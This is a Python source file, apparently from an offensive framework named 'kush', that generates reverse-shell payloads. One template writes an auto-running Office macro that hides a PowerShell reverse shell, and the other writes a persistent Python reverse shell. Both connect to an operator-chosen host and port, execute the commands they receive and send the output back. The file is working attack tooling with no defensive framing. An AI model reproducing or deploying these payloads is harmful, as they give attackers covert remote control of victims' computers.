# kush-framework/kush/payloads/templates.py
"""
Payload templates
"""

from abc import ABC, abstractmethod
from pathlib import Path

class PayloadTemplate(ABC):
    @abstractmethod
    def generate(self, lhost: str, lport: str, output_name: str,
                 output_dir: Path, **kwargs) -> str:
        pass

class VBSTemplate(PayloadTemplate):
    def generate(self, lhost: str, lport: str, output_name: str,
                 output_dir: Path, **kwargs) -> str:
        vbs_content = f'''Sub AutoOpen()
    CreateObject("Wscript.Shell").Run "powershell -Command \\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\\"", 0, False
End Sub
'''
        
        vbs_path = output_dir / f"{output_name}.vbs"
        with open(vbs_path, 'w') as f:
            f.write(vbs_content)
        
        return str(vbs_path)

class PythonTemplate(PayloadTemplate):
    def generate(self, lhost: str, lport: str, output_name: str,
                 output_dir: Path, **kwargs) -> str:
        script_content = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import time

def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('{lhost}', {lport}))
            
            while True:
                command = s.recv(1024).decode()
                if command.lower() == "exit":
                    s.close()
                    return
                
                output = subprocess.getoutput(command)
                s.send(output.encode())
                
        except Exception:
            time.sleep(10)

if __name__ == "__main__":
    main()
'''
        
        script_path = output_dir / f"{output_name}.py"
        with open(script_path, 'w') as f:
            f.write(script_content)
        
        script_path.chmod(0o755)
        return str(script_path)
